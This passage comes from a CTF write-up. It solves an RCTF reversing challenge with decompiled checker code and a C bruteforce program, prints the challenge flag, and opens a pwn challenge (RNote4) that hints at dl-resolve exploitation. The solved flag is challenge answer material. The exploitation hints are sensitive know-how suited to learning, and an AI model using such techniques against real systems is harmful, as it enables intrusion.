</span></span></code></pre></div><p>And, as said before, it xors the actual checker, <code>sub_401482</code>, with 0x28 before executing it on the flag. Let&rsquo;s have a look at the checker and the functions it uses, as that&rsquo;s where we can understand what the flag has to be.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>_BOOL8</span> <span class=kr>__fastcall</span> <span class=nf>sub_401482</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>target</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span> <span class=c1>// [rsp+8h] [rbp-40h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>mul</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span> <span class=c1>// [rsp+28h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [rsp+40h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+44h] [rbp-4h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>mul</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x556E4969</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>mul</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x2E775361</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>mul</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x893DAE7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>mul</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x96990423</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>mul</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x6CF9D3E9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>mul</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xA505531F</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>target</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x54A0B9BD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>target</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x4B818640</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>target</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x8EB63387</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>target</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xA9EABEFD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>target</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xB8CDF96B</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>target</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x113C3052</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>5</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>mul</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>flag</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=n>target</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>check1</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=o>*</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kr>__int16</span> <span class=o>*</span><span class=p>)</span><span class=n>flag</span> <span class=o>+</span> <span class=mi>14</span><span class=p>),</span> <span class=mh>0xF64BB17D</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>1870842076</span>
</span></span><span class=line><span class=cl>    <span class=o>||</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>check2</span><span class=p>(</span><span class=o>*</span><span class=p>((</span><span class=n>_WORD</span> <span class=o>*</span><span class=p>)</span><span class=n>flag</span> <span class=o>+</span> <span class=mi>14</span><span class=p>),</span> <span class=o>*</span><span class=p>((</span><span class=n>_WORD</span> <span class=o>*</span><span class=p>)</span><span class=n>flag</span> <span class=o>+</span> <span class=mi>15</span><span class=p>))</span> <span class=o>!=</span> <span class=mi>42134</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>24</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>31</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>^=</span> <span class=o>*</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>flag</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v5</span> <span class=o>==</span> <span class=mi>22</span> <span class=o>&amp;&amp;</span> <span class=o>*</span><span class=p>((</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)</span><span class=n>flag</span> <span class=o>+</span> <span class=mi>32</span><span class=p>)</span> <span class=o>==</span> <span class=sc>&#39;s&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>check1</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>b</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>e</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>res</span><span class=p>;</span> <span class=c1>// [rsp+14h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>res</span> <span class=o>=</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=n>e</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>e</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>res</span> <span class=o>=</span> <span class=n>v5</span> <span class=o>*</span> <span class=n>res</span> <span class=o>%</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>v5</span> <span class=o>=</span> <span class=n>v5</span> <span class=o>*</span> <span class=n>v5</span> <span class=o>%</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>e</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>res</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>check2</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int16</span> <span class=n>a</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kr>__int16</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int16</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// ST16_2
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int16</span> <span class=n>b</span><span class=p>;</span> <span class=c1>// [rsp+0h] [rbp-18h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>b</span> <span class=o>=</span> <span class=n>a2</span><span class=p>;</span> <span class=n>b</span> <span class=o>&amp;</span> <span class=n>a</span><span class=p>;</span> <span class=n>b</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=p>(</span><span class=n>b</span> <span class=o>&amp;</span> <span class=n>v2</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v2</span> <span class=o>=</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>^=</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int16</span><span class=p>)(</span><span class=n>b</span> <span class=o>|</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 class="relative group">Actual reversing<div id=actual-reversing class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#actual-reversing aria-label=Anchor>#</a></span></h3><p>The first 6 dwords if the flag are checked by multiplying each one by a constant and checking against another constant, as it&rsquo;s all 32 bit it&rsquo;s nothing we can&rsquo;t bruteforce - 24 characters done.
The last byte is trivially an <code>s</code> - one more done.
The remaining 8 are a bit trickier, as I had to find a way to bruteforce them quickly enough. The first thing needed was reversing <code>check1</code> and <code>check2</code>. The first one is modular exponentiation, thus <code>check1(b, e, n) = (b**e) % n</code>. The second one looks messy with all those bit operations but it&rsquo;s nothing more than a sum modulo <code>2**16</code>. With this information in mind let&rsquo;s setup a bruteforce:</p><ul><li>Trying all 2**64 combinations is just too slow</li><li>But thanks to check2 we know the sum of the last two 16bit chunks is 42134. Let&rsquo;s bruteforce only one and get the other</li><li>2**48 combinations is still too many&mldr;</li><li>We know the xor of all 8 bytes is 22, we can thus only iterate over 3 of the remaining 4</li><li>2**40 combinations, we&rsquo;re getting onto something</li><li>Let&rsquo;s only check printable characters, the ones in [0x20, 0x7F]</li><li>That&rsquo;s less than 2**35 tests, feasible in a few seconds!</li></ul><p>And so this mess was born, a mess that nonetheless gave us the flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstdio&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstdint&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>uint64_t</span> <span class=nf>check1</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>a2</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>a3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [rsp+4h] [rbp-18h]
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>uint64_t</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>uint64_t</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [rsp+14h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=n>v4</span> <span class=o>=</span> <span class=n>a2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v6</span> <span class=o>=</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>v5</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span> <span class=n>v4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span> <span class=n>v4</span> <span class=o>&amp;</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=n>v6</span> <span class=o>=</span> <span class=n>v5</span> <span class=o>*</span> <span class=n>v6</span> <span class=o>%</span> <span class=n>a3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>v5</span> <span class=o>=</span> <span class=n>v5</span> <span class=o>*</span> <span class=n>v5</span> <span class=o>%</span> <span class=n>a3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>v4</span> <span class=o>&gt;&gt;=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>v6</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>v9</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x556E4969</span><span class=p>,</span> <span class=mh>0x2E775361</span><span class=p>,</span> <span class=mh>0x893DAE7</span><span class=p>,</span> <span class=mh>0x96990423</span><span class=p>,</span> <span class=mh>0x6CF9D3E9</span><span class=p>,</span> <span class=mh>0xA505531F</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint32_t</span> <span class=n>v3</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=mh>0x54A0B9BD</span><span class=p>,</span> <span class=mh>0x4B818640</span><span class=p>,</span> <span class=mh>0x8EB63387</span><span class=p>,</span> <span class=mh>0xA9EABEFD</span><span class=p>,</span> <span class=mh>0xB8CDF96B</span><span class=p>,</span> <span class=mh>0x113C3052</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>output</span><span class=p>[</span><span class=mi>34</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// Bruteforce the first 24 bytes
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>6</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>uint32_t</span> <span class=n>val</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span><span class=p>(</span><span class=n>v9</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*</span> <span class=n>val</span> <span class=o>==</span> <span class=n>v3</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                        <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%02X%02X%02X%02X&#34;</span><span class=p>,</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                <span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=n>output</span><span class=p>)[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=n>val</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span><span class=p>(</span><span class=n>val</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// v0, v1, ..., v7 are the 8 bytes we&#39;re looking for
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>v4</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>v4</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>;</span> <span class=n>v4</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;v4 %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>v4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>v5</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>v5</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>;</span> <span class=n>v5</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=kt>uint32_t</span> <span class=n>v45</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>|</span> <span class=p>(</span><span class=n>v5</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=kt>uint32_t</span> <span class=n>v67</span> <span class=o>=</span> <span class=p>(</span><span class=mi>42134</span> <span class=o>-</span> <span class=n>v45</span> <span class=o>+</span> <span class=mh>0x10000</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=kt>uint32_t</span> <span class=n>v6</span> <span class=o>=</span> <span class=n>v67</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=n>v7</span> <span class=o>=</span> <span class=p>(</span><span class=n>v67</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span><span class=p>(</span><span class=n>v6</span> <span class=o>&lt;</span> <span class=mh>0x20</span> <span class=o>||</span> <span class=n>v6</span> <span class=o>&gt;</span> <span class=mh>0x7F</span> <span class=o>||</span> <span class=n>v7</span> <span class=o>&lt;</span> <span class=mh>0x20</span> <span class=o>||</span> <span class=n>v7</span> <span class=o>&gt;</span> <span class=mh>0x7F</span><span class=p>)</span> <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        
</span></span><span class=line><span class=cl>                        <span class=kt>uint32_t</span> <span class=n>x</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>^</span> <span class=n>v5</span> <span class=o>^</span> <span class=n>v6</span> <span class=o>^</span> <span class=n>v7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        
</span></span><span class=line><span class=cl>                        <span class=k>for</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>v0</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>v0</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>;</span> <span class=n>v0</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=k>for</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>v1</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>v1</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>;</span> <span class=n>v1</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                <span class=p>{</span>
</span></span><span class=line><span class=cl>                                        <span class=k>for</span><span class=p>(</span><span class=kt>uint32_t</span> <span class=n>v2</span> <span class=o>=</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>v2</span> <span class=o>&lt;=</span> <span class=mh>0x7F</span><span class=p>;</span> <span class=n>v2</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                        <span class=p>{</span>
</span></span><span class=line><span class=cl>                                                <span class=kt>uint32_t</span> <span class=n>x1</span> <span class=o>=</span> <span class=n>v0</span> <span class=o>^</span> <span class=n>v1</span> <span class=o>^</span> <span class=n>v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                                <span class=kt>uint32_t</span> <span class=n>v3</span> <span class=o>=</span> <span class=n>x</span> <span class=o>^</span> <span class=n>x1</span> <span class=o>^</span> <span class=mi>22</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                                
</span></span><span class=line><span class=cl>                                                <span class=k>if</span><span class=p>(</span><span class=n>v3</span> <span class=o>&lt;</span> <span class=mh>0x20</span> <span class=o>||</span> <span class=n>v3</span> <span class=o>&gt;</span> <span class=mh>0x7F</span><span class=p>)</span> <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                                
</span></span><span class=line><span class=cl>                                                <span class=kt>uint32_t</span> <span class=n>v0123</span> <span class=o>=</span> <span class=n>v0</span> <span class=o>|</span> <span class=p>(</span><span class=n>v1</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>v2</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>v3</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                                                <span class=k>if</span><span class=p>(</span><span class=nf>check1</span><span class=p>(</span><span class=n>v0123</span><span class=p>,</span> <span class=n>v45</span><span class=p>,</span> <span class=mh>0xF64BB17D</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x6F82C8DC</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                                <span class=p>{</span>
</span></span><span class=line><span class=cl>                                                        <span class=p>((</span><span class=kt>uint32_t</span> <span class=o>*</span><span class=p>)</span><span class=n>output</span><span class=p>)[</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=n>v0123</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                                        <span class=p>((</span><span class=kt>uint16_t</span> <span class=o>*</span><span class=p>)</span><span class=n>output</span><span class=p>)[</span><span class=mi>14</span><span class=p>]</span> <span class=o>=</span> <span class=n>v45</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                                        <span class=p>((</span><span class=kt>uint16_t</span> <span class=o>*</span><span class=p>)</span><span class=n>output</span><span class=p>)[</span><span class=mi>15</span><span class=p>]</span> <span class=o>=</span> <span class=n>v67</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                                        <span class=c1>// Sorry Dijkstra, I&#39;m using a goto...
</span></span></span><span class=line><span class=cl><span class=c1></span>                                                        <span class=k>goto</span> <span class=n>fi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                                <span class=p>}</span>
</span></span><span class=line><span class=cl>                                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                                <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nl>fi</span><span class=p>:;</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span><span class=p>[</span><span class=mi>32</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;s&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span><span class=p>[</span><span class=mi>33</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;RCTF{\%s}</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>output</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In just a few seconds it prints out <code>RCTF{5o_M@ny_an7i_Rev3rsing_Techn!qu3s}</code>. Done!</p><h2 class="relative group">RNote4<div id=rnote4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#rnote4 aria-label=Anchor>#</a></span></h2><p><a href="https://drive.google.com/open?id=1xL3tT2ttR2BJJsUi7kgoe13Nb2Ff5LXF" target=_blank>Attachment</a></p><p><strong>Disclaimer:</strong> this is an unintended solution.
No PIE and no leaks, it&rsquo;s evidently intended to be exploited via dl-resolve.
Looks like I had a brain fart and didn&rsquo;t think about that.</p><h3 class="relative group">Overview<div id=overview-11 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview-11 aria-label=Anchor>#</a></span></h3><p>We&rsquo;re given a 64-bit Linux ELF. Checksec shows canaries and NX, but no RELRO and PIE.</p><p>The binary&rsquo;s main loop reads a choice byte from stdin, and executes an action based on it.</p><p>Option 1 allocates a note:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>note</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>allocate</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>note</span> <span class=o>*</span><span class=n>note</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>g_num_notes</span> <span class=o>&gt;</span> <span class=mi>32</span><span class=p>)</span>
